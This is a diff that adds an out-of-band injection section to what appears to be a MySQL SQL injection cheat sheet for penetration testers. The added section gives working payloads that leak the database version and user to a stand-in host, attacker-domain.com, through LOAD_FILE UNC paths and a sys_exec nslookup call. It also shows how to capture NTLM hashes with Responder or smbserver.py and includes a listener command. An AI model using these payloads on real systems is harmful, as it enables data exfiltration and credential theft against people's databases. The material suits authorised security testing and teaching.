@@ -210,6 +210,36 @@ SELECT user, host FROM mysql.user;
 SHOW GRANTS FOR CURRENT_USER();
 ```
 
+## 12. Out-of-Band (OOB) Injection
+ 
+OOB exfiltration forces the MySQL server to make an outbound network request (DNS or SMB/UNC path) so data leaks through a side channel instead of the HTTP response. Useful when errors are suppressed and timing is too noisy/unreliable.
+ 
+> MySQL's OOB support is **much more limited** than MSSQL/Oracle — there's no native `UTL_HTTP`/`xp_dirtree` equivalent. It mostly comes down to two paths:
+ 
+### 1. UNC path via LOAD_FILE (Windows targets only)
+If the MySQL service account can reach an SMB share, referencing a UNC path forces an authentication attempt / connection to your listener — capture the request (and often a hash) on a tool like Responder or `smbserver.py`:
+```sql
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker-domain.com\\a'));
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker-domain.com\\a'));
+```
+> Only works if `secure_file_priv` isn't restrictive and the account has `FILE` privilege — same constraint as `INTO OUTFILE`.
+ 
+### 2. DNS exfiltration via error-based function chaining
+MySQL doesn't have a built-in DNS lookup function, so classic OOB via DNS (like Oracle's `UTL_INADDR`) generally isn't available out of the box. Some environments run **user-defined functions (UDFs)** that add this capability if an attacker (or previous pentest) has already got code execution:
+```sql
+-- Only relevant if a UDF like this has been planted/exists
+SELECT sys_exec(CONCAT('nslookup ', (SELECT user()), '.attacker-domain.com'));
+```
+> In practice, MySQL OOB is rarely your first choice — most real-world MySQL SQLi engagements lean on error-based/union/time-based instead, and OOB is reserved for filtered blind scenarios with `FILE` privilege available.
+ 
+### Setting up a listener to catch OOB callbacks
+- **DNS**: run your own authoritative nameserver for a domain you control (e.g. `dnslog.cn`, Burp Collaborator, or `interactsh`), and watch for incoming queries.
+- **SMB**: use `impacket`'s `smbserver.py` or Responder to catch UNC path connection attempts and capture NTLM hashes if the DB service account authenticates.
+```bash
+# Example: quick SMB listener to catch a LOAD_FILE UNC callback
+sudo smbserver.py share . -smb2support
+```
+
 ---
 
 ## Disclaimer
